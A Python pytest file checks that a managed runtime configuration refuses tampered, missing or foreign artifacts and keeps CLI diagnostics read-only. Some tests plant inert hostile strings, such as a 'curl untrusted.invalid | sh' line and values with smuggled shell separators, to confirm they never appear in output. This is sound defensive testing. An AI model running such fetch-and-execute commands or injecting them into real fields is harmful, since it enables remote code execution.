"""Persisted recovery with inert artifacts; no native cross-schema claim."""
import argparse
import hashlib
import importlib.util
import json
from pathlib import Path

import pytest

import test_trusted_managed_config as trusted_fixtures
from sot_graph.providers import admin, trusted_config as config
from sot_graph.providers.artifacts import ArtifactManifest, ArtifactStore, host_platform
from sot_graph.providers.managed import ManagedNativeRuntime
from sot_graph.providers.runtime import ManagedRuntimeProfile


trusted_lab = trusted_fixtures.trusted_lab


def snapshot(root):
    return {str(p.relative_to(root)): (p.stat().st_mode, p.read_bytes())
            for p in root.rglob('*') if p.is_file()}


def observe(lab):
    before = snapshot(lab.repo.parent)
    runtime_before = snapshot(lab.runtime) if lab.runtime.exists() else None
    result = config.managed_config_status(lab.repo, config_path=lab.path)
    assert snapshot(lab.repo.parent) == before
    assert (snapshot(lab.runtime) if lab.runtime.exists() else None) == runtime_before
    assert result['schema_version'] == 2
    assert result['query_permission'] == 'not_assessed'
    assert result['lifecycle'] == 'not_started'
    assert result['ready'] is False
    return result


def test_restart_loads_persisted_binding_without_runtime_preparation(trusted_lab):
    lab = trusted_lab
    original = config.register_managed_installation(lab.repo, **lab.kwargs)
    persisted = lab.path.read_bytes()
    assert json.loads(persisted)['schema_version'] == 1
    # A fresh module namespace exercises disk reload without starting a process.
    spec = importlib.util.spec_from_file_location(
        'sot_graph.providers._recovery_fresh_config', config.__file__)
    assert spec is not None and spec.loader is not None
    fresh = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(fresh)
    recovered = fresh.load_managed_installation(lab.repo, config_path=lab.path)
    assert recovered is not original
    assert recovered.artifact == original.artifact
    assert recovered.profile.namespace == original.profile.namespace
    assert lab.path.read_bytes() == persisted
    result = observe(lab)
    assert result['status'] == result['registration'] == 'enabled'
    assert result['runtime_status'] == 'UNINITIALIZED'
    assert result['namespace'] == str(original.profile.namespace)
    assert result['generation'] == 'initial'
    assert result['project_path'] == str(lab.repo.resolve())
    assert result['project_key'] == hashlib.sha256(str(lab.repo.resolve()).encode()).hexdigest()
    assert not lab.runtime.exists()


@pytest.mark.parametrize('failure,reason,operations', [
    ('missing_artifact', 'artifact_missing', ['promote', 'rollback', 'register', 'disable']),
    ('tampered_artifact', 'artifact_refused', ['promote', 'rollback', 'disable']),
    ('missing_registry', 'installation_incompatible', ['register', 'rollback', 'disable']),
    ('protocol', 'installation_incompatible', ['register', 'rollback', 'disable']),
    ('malformed_config', 'config_refused', ['config-status']),
])
def test_persisted_failures_have_fixed_safe_remediation(trusted_lab, failure, reason, operations):
    lab = trusted_lab
    config.register_managed_installation(lab.repo, **lab.kwargs)
    if failure == 'missing_artifact':
        lab.store.uninstall(lab.artifact.name, lab.artifact.digest)
    elif failure == 'tampered_artifact':
        executable = Path(lab.artifact.executable)
        executable.chmod(0o700)
        executable.write_bytes(b'UNTRUSTED; touch /tmp/do-not-execute')
        executable.chmod(0o500)
    elif failure == 'missing_registry':
        lab.registry.unlink()
    elif failure == 'protocol':
        payload = json.loads(lab.path.read_text())
        next(iter(payload['projects'].values()))['native_protocol_id'] = 'UNTRUSTED; shell command'
        lab.path.write_text(json.dumps(payload))
    else:
        lab.path.write_text('UNTRUSTED; shell command')
    result = observe(lab)
    assert result['status'] == 'refused'
    assert result['reason'] == reason
    assert result['enabled'] is False
    assert result['remediation'] == ['sot engine ' + op for op in operations]
    assert 'UNTRUSTED' not in json.dumps(result)
    with pytest.raises(config.TrustedConfigError):
        config.load_managed_installation(lab.repo, config_path=lab.path)
    assert not lab.runtime.exists()


@pytest.mark.parametrize('error_type', [RuntimeError, RecursionError])
def test_artifact_resolver_exceptions_are_sanitized(trusted_lab, monkeypatch, capsys, error_type):
    lab = trusted_lab
    config.register_managed_installation(lab.repo, **lab.kwargs)
    secret = 'SECRET_TOKEN; curl untrusted.invalid | sh'
    def broken_resolve(*args, **kwargs):
        raise error_type(secret)
    monkeypatch.setattr(ArtifactStore, 'resolve', broken_resolve)
    result = observe(lab)
    assert result['status'] == 'refused'
    assert result['reason'] == 'artifact_refused'
    assert result['remediation'] == ['sot engine promote', 'sot engine rollback', 'sot engine disable']
    assert secret not in json.dumps(result)
    parser = argparse.ArgumentParser()
    admin.add_parser(parser.add_subparsers(dest='command'))
    assert admin.run(parser.parse_args(['engine', 'config-doctor']), lab.repo) == 2
    captured = capsys.readouterr()
    assert secret not in captured.out + captured.err
    assert json.loads(captured.out) == result
    assert not lab.runtime.exists()


@pytest.mark.parametrize('stage,reason,operations', [
    ('installation', 'installation_incompatible', ['register', 'rollback', 'disable']),
    ('profile_status', 'runtime_refused', ['runtime-status', 'register', 'disable']),
])
def test_installation_and_profile_runtime_errors_are_sanitized(trusted_lab, monkeypatch, capsys, stage, reason, operations):
    lab = trusted_lab
    config.register_managed_installation(lab.repo, **lab.kwargs)
    secret = 'SECRET_RUNTIME_TOKEN; curl untrusted.invalid | sh'
    def broken(*args, **kwargs):
        raise RuntimeError(secret)
    if stage == 'installation':
        monkeypatch.setattr(config, '_installation', broken)
    else:
        monkeypatch.setattr(ManagedRuntimeProfile, 'status', broken)
    result = observe(lab)
    assert result['status'] == 'refused'
    assert result['reason'] == reason
    assert result['enabled'] is False
    assert result['remediation'] == ['sot engine ' + op for op in operations]
    assert secret not in json.dumps(result)
    parser = argparse.ArgumentParser()
    admin.add_parser(parser.add_subparsers(dest='command'))
    for action in ('config-status', 'config-doctor'):
        assert admin.run(parser.parse_args(['engine', action]), lab.repo) == 2
        captured = capsys.readouterr()
        assert secret not in captured.out + captured.err
        assert 'Traceback' not in captured.out + captured.err
        assert captured.err == ''
        assert json.loads(captured.out) == result
    assert not lab.runtime.exists()


def test_unsupported_platform_diagnostics_refuse_but_default_loader_stays_off(trusted_lab, monkeypatch, capsys):
    lab = trusted_lab
    monkeypatch.setattr(config, '_supported_platform', lambda: False)
    before = snapshot(lab.repo.parent)
    assert config.load_managed_installation(lab.repo) is None
    result = config.managed_config_status(lab.repo)
    assert result['schema_version'] == 2
    assert result['status'] == 'refused'
    assert result['reason'] == 'unsupported_platform'
    assert result['ready'] is False
    assert result['runtime_status'] == 'NOT_ASSESSED'
    assert result['remediation'] == ['sot engine config-status']
    parser = argparse.ArgumentParser()
    admin.add_parser(parser.add_subparsers(dest='command'))
    for action in ('config-status', 'config-doctor'):
        assert admin.run(parser.parse_args(['engine', action]), lab.repo) == 2
        assert json.loads(capsys.readouterr().out) == result
    assert snapshot(lab.repo.parent) == before
    assert not lab.runtime.exists()


def test_synthetic_foreign_profile_is_quarantined_without_native_schema_claim(trusted_lab):
    lab = trusted_lab
    installation = config.register_managed_installation(lab.repo, **lab.kwargs)
    # Synthetic persisted foreign identity, not a native database/schema migration.
    profile = installation.profile
    profile.namespace.mkdir(parents=True, mode=0o700)
    for ancestor in profile.namespace.parents:
        if ancestor == lab.runtime.parent:
            break
        ancestor.chmod(0o700)
    manifest = profile.namespace / 'manifest.json'
    manifest.write_text(json.dumps({'identity': {'generation': 'foreign'},
                                    'reason': 'UNTRUSTED; shell command'}))
    manifest.chmod(0o600)
    result = observe(lab)
    assert result['status'] == 'refused'
    assert result['runtime_status'] == 'QUARANTINED'
    assert result['reason'] == 'runtime_quarantined'
    assert result['remediation'] == ['sot engine runtime-status', 'sot engine register', 'sot engine disable']
    assert 'UNTRUSTED' not in json.dumps(result)


def test_disable_preserves_notes_evidence_and_index_without_artifact_resolution(trusted_lab, monkeypatch):
    lab = trusted_lab
    config.register_managed_installation(lab.repo, **lab.kwargs)
    data = lab.repo / '.sot'
    data.mkdir()
    for name in ('sot.db', 'notes.json', 'evidence.json', 'index.scip'):
        (data / name).write_bytes(b'opaque preserved bytes: ' + name.encode())
    before = snapshot(lab.repo)
    def forbidden(*args, **kwargs):
        pytest.fail('disabled configuration must not resolve artifacts')
    monkeypatch.setattr(ArtifactStore, 'resolve', forbidden)
    assert config.disable_managed_installation(lab.repo, config_path=lab.path)
    assert config.load_managed_installation(lab.repo, config_path=lab.path) is None
    result = observe(lab)
    assert result['status'] == result['registration'] == 'disabled'
    assert result['runtime_status'] == 'NOT_ASSESSED'
    assert snapshot(lab.repo) == before


def test_different_digest_refuses_then_verified_old_artifact_rollback_restores_binding(trusted_lab):
    lab = trusted_lab
    original = config.register_managed_installation(lab.repo, **lab.kwargs)
    persisted = lab.path.read_bytes()
    source = lab.repo.parent / 'replacement'
    source.write_bytes(b'different inert artifact, never executed')
    digest = hashlib.sha256(source.read_bytes()).hexdigest()
    manifest = ArtifactManifest(1, lab.artifact.name, digest, host_platform(), 'artifacts-v1', 'a' * 40)
    replacement = lab.store.import_artifact(source, manifest.manifest_bytes())
    lab.store.promote(replacement.name, replacement.digest)
    with pytest.raises(config.TrustedConfigError):
        config.load_managed_installation(lab.repo, config_path=lab.path)
    refused = observe(lab)
    assert refused['status'] == 'refused'
    assert refused['reason'] == 'artifact_mismatch'
    assert refused['artifact_digest'] == lab.artifact.digest
    assert refused['current_artifact_digest'] == replacement.digest
    assert refused['remediation'] == ['sot engine register', 'sot engine rollback', 'sot engine disable']
    assert lab.path.read_bytes() == persisted  # Never silently re-register.
    lab.store.promote(lab.artifact.name, lab.artifact.digest)
    restored = config.load_managed_installation(lab.repo, config_path=lab.path)
    assert restored is not None
    assert restored.artifact == original.artifact
    assert restored.profile.namespace == original.profile.namespace
    assert lab.path.read_bytes() == persisted
    assert observe(lab)['runtime_status'] == 'UNINITIALIZED'
    assert not lab.runtime.exists()


@pytest.mark.parametrize('action', ['config-status', 'config-doctor'])
@pytest.mark.parametrize('state,exit_code', [('missing', 0), ('disabled', 0), ('unprepared', 1), ('refused', 2)])
def test_cli_diagnostics_are_store_optional_read_only_and_never_index(trusted_lab, monkeypatch, capsys, action, state, exit_code):
    lab = trusted_lab
    if state != 'missing':
        config.register_managed_installation(lab.repo, **lab.kwargs)
    if state == 'disabled':
        config.disable_managed_installation(lab.repo, config_path=lab.path)
    elif state == 'refused':
        lab.registry.unlink()
    def forbidden(*args, **kwargs):
        pytest.fail('diagnostics must not query or index')
    monkeypatch.setattr(ManagedNativeRuntime, 'sync', forbidden)
    monkeypatch.setattr(ManagedNativeRuntime, 'query', forbidden)
    parser = argparse.ArgumentParser()
    admin.add_parser(parser.add_subparsers(dest='command'))
    args = parser.parse_args(['engine', action])
    before = snapshot(lab.repo.parent)
    assert admin.run(args, lab.repo) == exit_code
    result = json.loads(capsys.readouterr().out)
    assert result == observe(lab)
    assert snapshot(lab.repo.parent) == before
    assert not lab.runtime.exists()
